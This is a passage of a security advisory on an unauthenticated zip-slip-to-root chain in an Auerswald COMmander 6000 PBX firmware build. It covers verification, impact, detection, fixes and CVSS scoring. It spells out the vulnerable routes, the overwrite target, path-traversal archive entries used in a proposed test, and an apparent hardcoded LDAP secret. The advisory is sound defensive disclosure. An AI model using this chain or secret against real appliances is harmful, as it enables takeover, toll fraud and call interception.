| Q3 | slip | hijacked (payload in place from Q2) | 200 on both; response body carries `<token>:uid=0:user=root`; marker files at `/data/log/MARKER_RCE_R4` and `/opt/auerswald/RCE_PROOF_R4.txt` reading `uid=0(root) gid=0(root) groups=0(root)` | nothing - this is the finding |
| Q4 | benign, re-run after the original binary was written back | restored (digest re-verified against `afc33cdf96b060e636c463e622b6ae1b`) | the trigger's proof line is gone; no marker; recorded as `POST_RESTORE_CONTROL_CLEAN` | that the proof line came from residual state left by an earlier run, and that the testbed had been left modified |

Read along the main diagonal, Q1 against Q3 is the same two routes with the same request shapes on
one testbed, differing only in the archive content and in the bytes sitting at a constant path, so
the benign baseline and the full chain are directly comparable and the result is attributable rather
than merely observed. Read along the anti-diagonal, Q2 and Q4 each vary one thing at a time: Q2 adds
the write without a consumer, Q4 removes the write and keeps the consumer. Q4 is additionally the
reversibility proof - the appliance returns to its original behaviour once the original bytes are
restored, so the finding is a property of file content rather than of some state our testing left
behind.

Two further falsification probes belong with this cross. First, a parameter-name change on a sibling
provisioning export route (`selectedRows=10001` answering 200 while `ids=10001` and
`selectedRows[]=10001` answer 500) shows these handlers are parameter-sensitive, so a blanket 200
cannot explain any quadrant. Second, the uniqueness-string round trip - a distinctive string placed
inside a benign archive and later found intact inside the extracted file at
`/data/provisioning/benign.xml` - proves that the bytes our client sends are the bytes the
application stores, closing the alternative explanation that some intermediary rewrote the body.

### Dynamic Verification — the configured-state control

The obvious objection to an unauthenticated finding on a freshly initialised image is that it only
works because the device was virgin — no administrator password set, no extension users, no
provisioning data. We closed that objection directly rather than arguing about it.

The configuration database table `MiscPrefs` was updated so that `cryptPassWD` held a non-empty
value (`cGFzc3dvcmQxMjM=`, i.e. a base64 password hash — note the direction: this is a
**tightening** of the device state, not a relaxation). Both the application and the web server were
restarted. The whole chain was then re-run from a cookie-less starting point.

Result: the 401 control set still returned 401; `about_state` still returned 200; both chain
requests still returned 200; and the marker again read `uid=0(root) gid=0(root) groups=0(root)`
with an inline `uid=0`. Afterwards the database was restored and its digest re-verified against the
pre-test value, and `cryptPassWD` was returned to its empty state.

One honest caveat about that control, so it is not over-read: `admin_account_state` continued to
echo empty password fields after the change, because the value was written at the database layer
rather than through the `admin_account_save` route (which, as it happens, returns a success document
without persisting anything — a separate defect disclosed alongside this one). What establishes
that the device was in a configured state is not the echo but the behaviour: a non-empty password
hash was present in the configuration store and, after restart, the service-technician and DAA
routes still enforced 401 while the provisioning and diagnostics routes still did not. The
conclusion we draw is the narrow and defensible one — this chain does not depend on the
administrator password being unset.

### Dynamic Verification — boundaries of what was verified

Stated without softening:

- **User-mode emulation of the ARM rootfs, not a physical appliance.** No COMmander 6000 or 6000R
  hardware was used at any point.
- **No separate network host.** The HTTP client and the appliance stack ran on one machine and
  communicated over a loopback-only host port. No packet traversed a wire, so we have not
  demonstrated reachability from a remote network position — we have demonstrated that nothing in
  the product distinguishes a loopback client from a remote one at either hop (both requests are
  ordinary inbound HTTP to the management listener, with no source-address logic observed in either
  handler).
- **Kernel identity.** Under user-mode emulation the kernel is the host's; the userland is fully the
  ARM rootfs. Anything depending on kernel behaviour (the `auer*` modules, `/proc/auer/*`,
  `/dev/auer/logger`) is absent. Neither hop of this chain uses the HAL, so the absence does not
  weaken the finding — but it does mean application logging was unavailable and the vendor's
  service-technician challenge channel could not be exercised at all.
- **Web server configuration.** Our lighttpd instance used a minimal configuration derived from the
  vendor's own files, with two directives added during verification (`server.upload-dirs`,
  `server.stream-request-body`) and without the IPv6 or TLS sockets. The route semantics that matter
  here are the vendor's FastCGI catch-all, which was preserved verbatim.
- **One firmware build.** 8.6D build 128154 only. Older and newer builds were not compared, and no
  previous-version image was available offline to diff against.
- **Second hop uses one consumer.** We fired the `hping2` overwrite through
  `/netdiagnostic_execute`. Persistence-style targets (`scripts/run-*`, lighttpd configuration,
  document root) were not fired and are argued statically only.
- **`ForceAdmin` and `BEARER` login branches unread.** No claim either way; not needed here.
- **Not verified on a live production deployment**, and no customer or third-party system was
  touched at any point.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The attacker needs the ability to send two HTTP requests to the appliance's management listener.
Nothing more. Specifically:

- No credentials, no cookies, no session, no CSRF token, no referer requirement. The ip-editor
  referer branch in `fastcgi.conf` is not needed — the catch-all branch reaches
  `/provisioning_data_import` without any referer, and the referer branch only changes
  `SCRIPT_NAME` shaping. Three referer variants were probed with no access difference.
- No privileged network segment is required by the product's own logic; whether one exists is a
  deployment property. An appliance that publishes its management listener to a user VLAN, a
  guest network or (worst case) the internet is reachable by anyone who can reach it. The
  force-HTTPS configuration exempts `/ikontbuch` and `/autoprov/` from the redirect but not our two
  routes, so a TLS-only deployment still serves this chain over TLS on the same listener.
- No timing dependency, no race, no brute force, no lockout risk. Both requests are single-shot and
  idempotent.
- The two halves may be separated in time. Hop 1 persists on flash; hop 2 can come later. This
  makes correlation by proximity unreliable for defenders.

### Reachability and impact — what the achieved identity controls

`uid=0(root) gid=0(root) groups=0(root)` on the appliance, with no privilege boundary between the
web application and the operating system, and with zero suid binaries in the rootfs because none
are needed. Concretely, that identity controls everything the appliance is:

- **Telephony.** The SIP stack (`resipd`), the voicemail and voice-mail-distribution components
  (`vmd`, `vmf_files`, `vd`, `ets`), the DSP channel configuration, and every extension the device
  serves. Root means the ability to place, redirect, record or drop calls, and to reconfigure
  trunks.
- **Credentials.** The configuration database under `/data/db/` (`konfig*.db`, whose schema is
  visible in the binary and includes fields such as `cryptPasswd`, `ikonPasswd`, `passwd`,
  `passwdLdap`, `AdminPasswd`, `AdminPasswdHash`, `passwordHash`, `remote_access_token`), user
  certificates and private keys under `/data/certs/user-certs` and `/data/certs/sips-certs`, the
  SIP trunk and gateway credentials in the provisioning data, and `/data/etc/ftpd.passwd`. For an
  IP-PBX this is the crown-jewel set: extension credentials, trunk credentials and the material
  needed to impersonate the organisation's telephony.
- **Call detail records and metadata.** Billing and CDR structures (`geb_konto`, `listgespr`,
  `gespr_erfasssung`, the LCR/soft-LCR route tables) are all in the configuration and data
  partitions readable by root: who called whom, when, for how long, and at what cost.
- **Voicemail content.** The voicemail boxes and message files are on the data partition.
- **Managed endpoints.** The device auto-provisions its phone fleet from templates under
  `/opt/auerswald/provisioning/` and from `/data/provisioning/`. Root on the PBX means the ability
  to push configuration — including credentials and firmware locations — to every managed handset.
- **Firmware and boot state.** `updater`, `webupdate`, `certupdater` and the firmware partition are
  root-accessible, so the compromise can be made to survive a firmware update cycle.
- **Network position.** The appliance sits on the voice and management VLANs and has raw capture
  capability (`tcpdump`, `hping2`, `pcap` tooling are all shipped in the image). Root turns it into
  a pivot and a sniffing point for adjacent segments.
- **Availability.** Root can stop the telephony stack, corrupt the database, unmount or overwrite
  the web document root, or reboot the device at will.

Toll fraud is the standard real-world monetisation of a compromised PBX: with trunk credentials and
the ability to place calls, an attacker can generate large terminated-traffic bills, and the
organisation usually discovers it on the next invoice rather than through a security alert. Call
interception and full call-metadata collection for every user the appliance serves are the
confidentiality counterpart, and for a business whose calls include customer, legal, medical or
financial conversations that is a data-breach event, not merely an IT incident.

### Reachability and impact — the unauthenticated question, answered in full

The single most important thing a reader needs to be sure of is that no credential of any kind is
involved. The evidence, in order of strength:

1. **Both requests were sent with no `Cookie` header and no `Authorization` header** — not a
   missing or expired session, but no session material at all. That is directly observable in the
   request reconstruction in section 9.
2. **The product's own authorization gate demonstrably works in the same run.** The control set
   (`daemontools_state`, `servicetools_state`, `servicetrace.pcap`) returned 401 to the same
   cookie-less client, before and after the exploit, and after the configuration tightening. An
   environment in which our 200s were an artefact would have returned 200 there too.
3. **One shared handler answers both ways.** `FUNC 0x3b018` returns 200 under the level-2 route
   name `ethernettrace.pcap` and 401 under `servicetrace.pcap` (level 4) and `daemontools.pcap`
   (level 6). Identical code, opposite outcome, so the difference is route-family scoping in the
   gate — an internal structural proof, not a black-box inference.
4. **The gate has one implementation and one caller.** `web_checkAccess` (`0xf5d68`) is called only
   from `web_auth` (`0x15958`), so authorization is not scattered; the coverage question is answerable
   from the code, and the answer is that the service-technician and DAA families are covered while
   the level-0 through level-3 population is not.
5. **It holds in the configured state.** With a non-empty password hash in `MiscPrefs.cryptPassWD`
   and both processes restarted, the chain still reached `uid=0(root)`. So the result is not an
   artefact of an unconfigured device.
6. **The chain uses no auxiliary primitive.** It does not depend on the unauthenticated packet
   capture route, on any on-path position, on captured credentials, on a session obtained by any
   means, or on the hardware abstraction layer. Both hops are direct inbound HTTP requests to the
   management listener.
7. **The declared route level is 2 for both** — nominally an administrator level. The product simply
   does not enforce it. We report the enforcement reality because it is what was measured, and we
   report the declared value too because the discrepancy is itself the finding.

### Reachability and impact — persistence

Persistence is not part of the demonstrated chain, and we do not claim having installed a backdoor.
It is worth stating what the write primitive makes available, because a defender scoping the
incident needs to know what to look for beyond the restored binary:

- overwriting any `/opt/auerswald/scripts/run-*` service script, which busybox init respawns as
  root with no privilege drop, yields execution that survives reboot;
- overwriting lighttpd configuration or the web document root yields control of what administrators
  and phones are served, with the FastCGI backend remaining root regardless of the `web` user
  assigned to the static layer;
- modifying the configuration database or provisioning templates yields control of managed handsets;
- modifying the firmware partition or the `updater` path yields survival across a firmware update.

An incident response scoped to "restore `hping2` and rotate the admin password" would not address
any of these, which is why section 11's operator guidance is written around integrity verification
of the whole rootfs rather than one file.

### Reachability and impact — detection notes

- **Response-body signal.** A diagnostics response whose body contains shell output that `hping2`
  cannot produce — `uid=`, `/bin/sh` error text, or arbitrary command output — is a decisive
  indicator. Genuine responses are `hping2` statistics.
- **Binary integrity.** `/opt/auerswald/hping2` should be 74,376 bytes with digest
  `afc33cdf96b060e636c463e622b6ae1b` in this build. A 256-byte text file at that path, or a leading
  `#!`, is conclusive. The same check applies to `/opt/auerswald/minizip/miniunz`
  (`36eb80de5ac55a8bbfc31e77c1d10e3d`, 63,260 bytes) — and note from section 8 that an attacker who
  targets the extractor may leave it zero bytes long, which is itself an alarm.
- **Unexpected files.** Root-owned mode-0666 files under `/data/log/`, `/opt/auerswald/minizip/` or
  anywhere outside `/data/provisioning/` are the signature of the slip's landing sites. Markers
  from a security test will look exactly like this.
- **Process telemetry.** A `miniunz` child of `webserver` with `-o -x -d` arguments at a time when
  no administrator was importing provisioning data; and a `/bin/sh -c /opt/auerswald/hping2 ...`
  child whose parent is the same process.
- **Request telemetry.** A `POST /provisioning_data_import` from a client that has no session, and
  a `POST /netdiagnostic_execute` with no session. Since neither route is authenticated, both also
  occur in some legitimate administrative flows; the combination from an unauthenticated client is
  what matters.
- **What you will not see.** No failed logins, no 401s, no privilege-change events, no session
  creation. The application's own `run shell cmd:` logging will show a completely ordinary
  diagnostics command line, because the command line *was* ordinary.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

Ordered so that the first item alone closes this chain, and each later item removes a class of
related chain.

1. **Contain every archive entry at the extractor boundary (fixes the root cause).** Before writing
   any entry, resolve the intended destination and verify containment. Concretely, in the helper
   that builds the `miniunz` invocation (`FUNC 0xedf60`) and/or in the extraction wrapper itself:
   - reject any entry name containing a `..` path component;
   - reject any absolute entry name;
   - reject symlink entries outright (a symlink whose target is later written is the same primitive);
   - resolve `realpath(extract_dir + entry)` and require the result to be a descendant of
     `realpath(extract_dir)`;
   - refuse to write to a path that already exists unless it is inside the extraction directory.
   The cheapest structural fix is to replace the bundled minizip example extractor with an
   extraction routine that implements `--no-absolute-filenames`-style semantics by default, or to
   extract into a fresh empty temporary directory and then move only allowlisted relative paths into
   their destinations.
2. **Stop passing `-o`.** Overwrite-without-confirmation is what turned a stray write into a silent
   replacement of a system binary. Extract into a clean directory and let the application decide,
   entry by entry, whether a destination may be replaced.
3. **Allowlist what a provisioning import may contain.** This product's legitimate provisioning
   archives carry phone configuration templates; the valid names are already compile-time constants
   in the binary (`/opt/auerswald/provisioning/*_template.xml`, `*_template.cfg`, and the device
   XML families). Validate the entry set against that allowlist and reject the archive otherwise,
   rather than extracting first and validating the result later.
4. **Never let an import path write to executable locations.** Hard-reject any destination under
   `/opt/**`, `/bin/**`, `/sbin/**`, `/usr/**`, `/etc/**` and `/lib/**` from any upload-driven
   extraction, regardless of containment. This is defence in depth: it would have stopped this chain
   even with the containment bug intact.
5. **Close the authorization gap, family-independently (fixes reachability).** Authorization in this
   product is attached to route families rather than to operations, so 738 of 750 routes are
   reachable anonymously. Two changes are needed together:
   - make `web_checkAccess` (`0xf5d68`) the mandatory gate for every route, default-deny, with an
     explicit allowlist of genuinely public routes (`about_state`, login, CSP reporting, static
     assets) rather than an implicit allowlist of two privileged families;
   - enforce the declared AccessLevel from the route table. Provisioning import, provisioning
     export, configuration backup export, backup restore, diagnostics execution, template renaming,
     language/locale changes and admin-account changes must all require the session they declare.
   The `0x3b018` asymmetry (`ethernettrace.pcap` 200 vs `servicetrace.pcap` and `daemontools.pcap`
   401) is the cleanest regression target, because one handler currently answers both ways.
6. **Add privilege separation (removes the class of "one write = root").** Run `webserver` as a
   dedicated unprivileged user with the minimum capability set, and give the extraction helper a
   separate confined identity that can write only under `/data/provisioning/`. Mount `/opt`
   read-only, or protect the vendor tree with dm-verity / IMA appraisal so that a write to a
   shipped binary is rejected by the kernel rather than accepted by the filesystem. The rootfs
   currently contains no suid binaries, so introducing a real privilege boundary does not require
   touching the escalation surface at all.
7. **Stop invoking root-consumed binaries by mutable path from a root shell.** The second hop works
   because `/bin/sh -c "/opt/auerswald/hping2 ..."` names a file that the same process can write.
   Either verify the tool's digest before invocation, or run diagnostics through a small helper
   whose binary lives on a read-only mount, or pass argv directly to `posix_spawn` (which the
   product already does for 39 other call sites) so that no shell is involved.
8. **Shrink the shell family to zero.** `auer_systemf_insecure` (`0x2247f0`) has 16 call sites and
   is the only wrapper in the family that runs a shell. Migrating those sites to the argv form used
   by `_auer_systemf_returncode` (`0x225168`, 39 sites) removes shell-metacharacter risk across the
   whole product, not just on this route. Where a shell is genuinely required (the packet-capture
   pipeline), document why and keep every slot server-derived, which is already the case there.
9. **Fix the false-success admin-account route.** `admin_account_save` returns
   `{"success":"true"}` even when the supplied old password is wrong, and does not persist anything.
   That is a correctness bug with security consequences (an operator believes a password was set
   when it was not) and it weakened our own configured-state test until we wrote the value at the
   database layer instead. Return a failure status and persist, or fail loudly.
10. **Re-check the long-standing `about_state` disclosure.** The route answers 200 anonymously and
    exposes model, type, `pbxId`, version and serial, matching the first facet of CVE-2021-40859;
    the third facet of that same advisory was removed in the meantime. Bringing it under
    authentication closes a public regression signal.

### Fix Recommendations — a regression test that would have caught this

Two tests, both cheap, both runnable in CI against a built firmware image:

- **Containment test.** Post an archive whose entries are `../escape.txt`,
  `../../escape.txt`, `../../../tmp/escape.txt`, `/tmp/absolute.txt` and a symlink entry pointing at
  `/etc/passwd`. Assert that the response is a 4xx or a structured error, that none of the
  destinations exists afterwards, and that a benign archive in the same test still imports
  successfully. The second assertion matters: a filter that breaks legitimate imports gets reverted,
  so the test has to protect both properties.
- **Authorization census.** Iterate the entire route table with a client carrying no cookies. Assert
  that every route whose declared AccessLevel is 1 or higher returns 401, and that the only 200s in
  the whole census are the explicitly allowlisted anonymous routes. Assert specifically that a
  single handler registered under three names returns the same status code for all three — that one
  assertion is the `0x3b018` asymmetry, encoded.

### Fix Recommendations — operator-side, until a patch exists

1. **Restrict the management listener.** Put the appliance's HTTP/HTTPS management interface on a
   dedicated management VLAN or behind a firewall rule that admits only named administration hosts.
   This is the single most effective measure available without a patch, because the chain needs
   nothing but network reachability.
2. **Front it with an authenticating reverse proxy** that denies, by path, at least
   `/provisioning_data_import`, `/provisioning_data_export`, `/netdiagnostic_execute`,
   `/backupdata_export_cfg`, `/backupdata_import_cfg`, `/ethernettrace.pcap`, `/wiresharktrace`,
   `/provisioning_data_rename_file`, `/languages_save` and `/ztb_image_save`. Require the proxy's own
   authentication before forwarding, since the appliance will not ask for any.
3. **Verify binary integrity.** Compare digests of `/opt/auerswald/hping2`
   (`afc33cdf96b060e636c463e622b6ae1b`) and `/opt/auerswald/minizip/miniunz`
   (`36eb80de5ac55a8bbfc31e77c1d10e3d`) against a known-good reference, and alert on any change, any
   size reduction, or any zero-length file. Extend file-integrity monitoring to the whole of `/opt`
   and to `/data/provisioning/`.
4. **Watch for root-owned mode-0666 files outside the data partitions**, particularly under
   `/data/log/` and `/opt/auerswald/minizip/`.
5. **Alert on unauthenticated POSTs to the import and diagnostics routes.** Neither route produces a
   session record, so the alert has to be built from request telemetry rather than from
   authentication logs.
6. **Treat the appliance as a tier-0 asset.** It holds extension credentials, trunk credentials,
   call records and voicemail for the whole organisation, and it is normally the least monitored
   server on the network. Log it to the SIEM the same way a domain controller is logged.
7. **If compromise is suspected, do not stop at restoring one binary.** Re-verify the entire vendor
   tree and the init scripts under `/opt/auerswald/scripts/`, rotate every credential the device
   holds (administrator accounts, extension passwords, SIP trunk credentials, LDAP bind credentials,
   syslog credentials), and re-issue device certificates. Section 10 lists what the achieved
   identity can reach; the write primitive also supports persistence in several places at once.
8. **Ask the vendor for a patched firmware** and for confirmation of which builds received the
   containment and authorization fixes, then diff the route-table census before and after the
   update.

## 12. CWE and CVSS

### CWE and CVSS — classification

- **CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"),
  specifically the zip-slip form.** The primary classification. Archive entry names are concatenated
  with the extraction directory and opened, with no normalisation and no containment check, in a
  root process. The traversal travels in the archive's central directory, not in a URL, which is
  why URL-level normalisation and the product's own HTTP filename sanitizer both miss it.
- **CWE-73 — External Control of File Name or Path.** Contributing, and the more precise label for
  the second half of hop 1: the application hands an attacker-controlled archive to a root
  extraction whose destination paths are entirely determined by that archive.
- **CWE-434 — Unrestricted Upload of File with Dangerous Type.** Contributing. The import route
  applies no type, format, size or content validation to the uploaded part before passing it to a
  privileged extractor.
- **CWE-862 — Missing Authorization.** Contributing, and structurally the reason the chain is
  anonymous. The routes declare AccessLevel 2 but the product's gate covers only the
  service-technician and DAA families. CWE-306 (Missing Authentication for Critical Function)
  describes the same gap from the deployment angle; we cite CWE-862 because the product *has* an
  authorization mechanism and does not apply it here.
- **CWE-250 — Execution with Unnecessary Privileges.** The architectural amplifier: the management
  application runs as uid 0 with no drop, so a file-write primitive in it is a root file-write
  primitive. This is not part of the vector arithmetic; it is why the impact metrics are all High.

Deliberately **not** classified as CWE-78 (OS Command Injection). No command string was injected at
any hop: every argument to every observed `execve` was either a constant or a legitimately
validated value. Labelling this as command injection would send the vendor to the wrong fix —
escaping and whitelisting, which they have already implemented correctly at
`0x87d8c` — instead of archive containment and route authorization. Getting this label right is
the difference between a patch that closes the chain and a patch that closes nothing.

### CWE and CVSS — vector derivation

Computed from the vector with the CVSS 3.1 formula and rounded up to the nearest tenth.

```text
vector: AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H

Impact Sub-Score
  ISS = 1 - ((1 - 0.56) * (1 - 0.56) * (1 - 0.56))
      = 1 - (0.44 * 0.44 * 0.44)
      = 1 - 0.085184
      = 0.914816
  Impact (Scope Unchanged) = 6.42 * 0.914816 = 5.873119

Exploitability
  = 8.22 * AV(0.85) * AC(0.77) * PR(0.85) * UI(0.85)
  = 8.22 * 0.85 = 6.987
  = 6.987 * 0.77 = 5.379990
  = 5.379990 * 0.85 = 4.572992
  = 4.572992 * 0.85 = 3.887043

Base (Scope Unchanged)
  = min(Impact + Exploitability, 10)
  = min(5.873119 + 3.887043, 10)
  = min(9.760162, 10)
  = 9.760162  ->  Roundup  ->  ceil(97.60162) / 10  =  98 / 10  =  9.8
```

Per-metric reasoning:

- **AV:N** — both hops are inbound HTTP requests to the appliance's management listener. Nothing
  requires local access, physical adjacency or an authenticated session on another service.
- **AC:L** — no conditions outside the attacker's control. Deterministic two-request sequence; no
  race; no timing window; no memory-layout or ASLR dependency; no need for a specific configuration
  state (demonstrated in both the freshly initialised and the tightened states); no dependency on the
  hardware abstraction layer; no on-path position. The only non-obvious requirement, the
  part-name-equals-filename multipart contract, is attacker-side correctness rather than an
  environmental condition, it is documented in the vendor's own shipped client, and once known it
  makes the chain reproducible every time. AC:H would require something the attacker cannot arrange,
  and nothing here qualifies.
- **PR:N** — zero credentials and zero cookies, proven in section 10 with a live 401 control set in
  the same run.
- **UI:N** — no administrator action, no click, no import initiated from the vendor UI, no social
  engineering step. Both requests are sent directly by the attacker.
- **S:U** — see the Scope decision below.
- **C:H / I:H / A:H** — root on the appliance: full read of the configuration database, certificates
  and keys, call records, voicemail and provisioning data; full write to the filesystem, firmware
  and telephony configuration; full control of availability, including of the voice path.

### CWE and CVSS — the Scope decision

Scope is the metric most worth arguing explicitly here, because two defensible readings exist and
they differ by a full point at the top of the scale.

**The reading we publish: Scope Unchanged.** The vulnerable component is the vendor's web
application (its provisioning import handler and the extractor it invokes). The impacted component
is the appliance's operating system and the services running on it. Those are normally different
components — but on this product they are not separated by any authority boundary. The application
*already runs as uid 0*; the rootfs contains no suid or sgid binaries because the vendor's design
never needed them; there is no privilege drop, no container, no chroot and no distinct security
domain for the web tier. Our chain therefore does not cross an authority boundary to affect another
component — it exercises, through a defect, an authority the vulnerable component already held. The
attacker moves from "root process that parses my HTTP request" to "root shell", and the granting
authority for both is the same: the appliance's own init, running the same uid. That is Scope
Unchanged, and it is also the convention this project applies consistently — running as the same
service identity on the same host is not a scope change, while cross-machine or cross-account
outcomes can be.

**The reading we considered and did not adopt: Scope Changed.** There is a genuine argument for it.
The vulnerable component is a network-facing web service, and the impact lands on a different
functional component — the telephony stack (`resipd`, `vmd`, `vd`, `ets`), the configuration
database, the certificate store and the managed phone fleet — none of which is inside the web
application's own authorization boundary. A network-facing management service yielding host-wide
root on an appliance that also holds call records and extension credentials is the sort of outcome
CVSS Scope-Changed was written to express, and an evaluator could reasonably publish
`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, which computes to 10.0 under CVSS 3.1 (the Scope-Changed
impact term is 6.128026, exploitability is unchanged at 3.887043, the sum is 10.015069, times 1.08
is 10.816, capped at the maximum).

We do not publish that as the headline, for one reason: the same-uid fact. Because the webserver is
already root by design, there is no boundary between the web component and the telephony component
to cross — they share one privilege domain that the vendor never partitioned. Publishing 10.0 would
attribute to the vulnerability a boundary crossing that the product's own architecture does not
have, and it would obscure the more useful message to the vendor: the privilege separation that
would make Scope Unchanged the *correct and comfortable* answer is itself a fix they should make
(recommendation 6). The alternative reading is stated here so that a reader who disagrees can see
exactly what we weighed, and so that the difference cannot be mistaken for an arithmetic error.

Note also that nothing in this chain depends on the amplifier facts we mention elsewhere — the empty
root password field in `/etc/passwd` (no `/etc/shadow` in this image), the telnet facility behind the
AccessLevel 6 route, the site-wide `script-src 'unsafe-inline'` CSP, or the unenforced client
certificate on the provisioning socket. Those are real and worth fixing, but folding them into the
vector would inflate it, so they are kept out of the arithmetic and reported separately.

### CWE and CVSS — adjacent disclosures that are not part of this score

During the same work we registered seventeen further defects in this firmware build, all of them
unauthenticated, none of them code execution, and none of them counted toward this finding. They are
being disclosed alongside it because they are useful to the vendor and because several of them
corroborate the authorization analysis. The ones worth naming here:

- **Unauthenticated root packet capture with the stream returned to the caller.** The level-2 route
  `ethernettrace.pcap` starts root `tcpdump` on `eth0` with snaplen 9018 and streams the capture
  back to the requesting client, with `ethernettrace.state` and `wiresharktrace` exposing capture
  state. The command was observed at `execve` level; all five format slots are server-derived
  (interface constant, snaplen constant, and ports from `SERVER_PORT`, `REMOTE_PORT` via
  `getpeername`, and `/data/etc/syslogd.conf`), so it is not injectable — the defect is the
  disclosure, not execution. On a production appliance this is plaintext capture of SIP, RTP and
  management traffic on the local segment. The same handler answering 401 under
  `servicetrace.pcap` and `daemontools.pcap` is the authorization-asymmetry proof used in section 3.
- **Unauthenticated full-configuration-package export.** `backupdata_export_cfg` (level 2) returns a body of roughly 10 KB to a cookie-less request
  (9,993 bytes in one run, 10,010 in another) and was observed running, as root,
  `exec tar -cz -C ../../.. data/db/konfig.cfg data/logo data/email data/provisioning
  data/certs/user-certs data/certs/deleted.txt --exclude data/provisioning/ipeditor`. The archive
  contents would include the configuration database (all credential fields), user certificate
  private keys, mail data and provisioning data. The stream is encrypted by
  `auer_stream_cryptFile`; **we did not recover its key derivation**, so whether this is a
  credential-disclosure defect or an adequately protected export is an open question, not a claim.
  It is the highest-value open item in the adjacent set.
- **Unauthenticated tampering with the phone-provisioning template library.**
  `provisioning_data_rename_file` (level 2) renames entries under `/data/provisioning/` and updates
  the database in step; we observed a template renamed and the DB `fileName` field changed
  accordingly. Managed handsets then receive altered configuration — a supply-chain-shaped
  availability and integrity defect with no execution required.
- **Unauthenticated root `mount`/`umount` on the live web document root.** `languages_save`
  (level 2) causes root to `umount` and then
  `mount -t squashfs /opt/auerswald/locale/<X>.fs /opt/auerswald/web/statics/html/`, persistently
  switching the UI language. The locale name is looked up from a table returned by `languages_all`
  (`[{"value":0,"locale":"de"},{"value":7,"locale":"en"}]`), so the raw HTTP string never reaches
  the command — injection attempts had their payload discarded and the default `de.fs` used — but the
  mount churn on a live docroot is itself an availability concern and a persistent configuration
  change made without authentication.
- **Unauthenticated privileged endpoint returning false success.** `admin_account_save`
  (level 3) answers `{"success":"true"}` even when `adminPwOld` is wrong, and a direct database
  inspection afterwards showed `ServerConfig.passwd` and `MiscPrefs.cryptPassWD` unchanged. This is
  CWE-862 plus CWE-392, and explicitly **not** an account takeover: nothing persisted. It is listed
  because an operator relying on that response would wrongly believe a password had been set.
- **Information disclosure set:** `about_state` (level 0; model, type, `pbxId`, version, serial — the
  surviving CVE-2021-40859 facet, still unpatched in this build and not counted here),
  `admin_account_state` (level 3; `AdminLogin` value plus password-field state),
  `serverconfig_state` (interface MACs, session limits, module list), `errichterdaten_state`
  (level 0; the installing contractor's full contact details, with password fields masked as
  `XXXXXX`), `tempdir_state` (directory listing of `/data/tmp` with sizes),
  `treeauthoring_state` (a 12,310-byte UI tree), and `/redirect` (level 0) whose `Set-Cookie` name
  embeds the device serial.
- **A root-side server-side request primitive:** `get_test_image?target=<host>` (level 0) resolves
  and connects to a caller-supplied host from the root process (strings include `www.google.de`,
  `get_sockaddr`, `hostname %s resolved to %s`, `IPv4|IPv6 Error Connecting to: %s`). Static
  evidence plus a level-0 route; we did not complete a dynamic SSRF assessment of it.
- **Unauthenticated log injection candidate:** `cspviolation` (level 0) formats attacker-supplied
  URI and violated-directive strings into the error log with `%s: %s`.
- **Residual cryptographic and hygiene risks**, disclosed as weaknesses rather than exploitable
  findings: a hardcoded string `auerswaldschandelah` referenced twice at `0x1ad1e4`, apparently an
  LDAP bind secret for the bundled `slapd` scaffolding, whose network reachability we did not
  establish (so we claim it is not exploitable as proven); one device-wide 2048-bit RSA private key
  shipped in the image at `/opt/auerswald/slogin/server.key`
  (md5 `b8704337814d47c462ba3a713c78b183`, certificate CN `Auerswald-Secure-Access`), identical on
  every device; an expired CA certificate (`slogin/ca.crt`, CN `Auerswald-Key-Management`); a
  4096-bit DSA verification path in a binary importing `EVP_sha1`, which raises a theoretical
  digest-agility concern we did not substantiate; syslog credentials written in cleartext into
  `/data/etc/syslogd.conf`; credentials carried in a URL query string of the form
  `https://%s:4433/provdata/?username=%s&password=%s`; `ssl.verifyclient.enforce = "disable"` on the
  provisioning socket; and a site-wide CSP with `script-src 'unsafe-inline'` (and `unsafe-eval` on
  the editor and help surfaces).

None of the items in this subsection is included in the CVSS vector or the score above, and none is
presented as established beyond what its evidence supports.

### CWE and CVSS — what is deliberately not published

- Only a non-destructive marker payload is published. The proof of concept echoes a token, writes one
  marker file and exits 0. No destructive, encrypting, exfiltrating or persistent payload is
  included, and nothing beyond what we actually ran during verification is provided.
- No configuration database, certificate, key, credential or call record was read or removed during
  verification, so there is nothing of that kind to publish.
- No working persistence mechanism is published. The `scripts/run-*` and lighttpd-configuration
  targets are named as statically available so the vendor can defend them, but no payload for them
  is provided and none was tested.
- The packet-capture defect is described, not weaponised. We explicitly did not build a chain that
  sniffs an administrator session to reach a session-gated route, because that would require an
  on-path position and would misrepresent the reachability of this finding.
- The `auer_stream_cryptFile` key derivation is named as an open question. We did not break it and we
  do not imply that the configuration export is decryptable.
- The `ForceAdmin` and `BEARER` branches of `web_auth` are named as unexamined. We publish no
  opinion about them.
- No session-forgery technique, no backdoor-account technique and no vendor service-technician
  challenge forgery is published, because none exists: the challenge verifier is public-key only and
  the device holds no private key.
- Nothing in this advisory identifies an individual. The vendor is named as a company with its
  country; no employee, developer or contact is credited or implicated.

### CWE and CVSS — summary

- **Score**: 9.8 Critical (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Alternative reading, argued and not adopted**: 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`),
  on the view that a network-facing web service yielding host-wide root on a telephony appliance
  crosses into a different component. We publish Scope Unchanged because the web application already
  runs as uid 0 and the product has no privilege boundary to cross.
- **Primary CWE**: CWE-22 (zip-slip path traversal in a root archive extraction)
- **Contributing CWEs**: CWE-73, CWE-434, CWE-862, CWE-250
- **Not** CWE-78: no command string was injected at either hop
- Our verification notes carry no CVSS assertion of their own; the value above was computed from the
  vector for this advisory, so there is no recorded score to correct.
- **Privilege ceiling**: `uid=0(root)` on the appliance, observed directly in the product's own
  process tree. Nothing beyond the appliance was reached or claimed, and no hypervisor, network or
  handset compromise is asserted.
- **Status**: unfixed in firmware 8.6D build 128154, the build analysed; no identifier assigned yet.
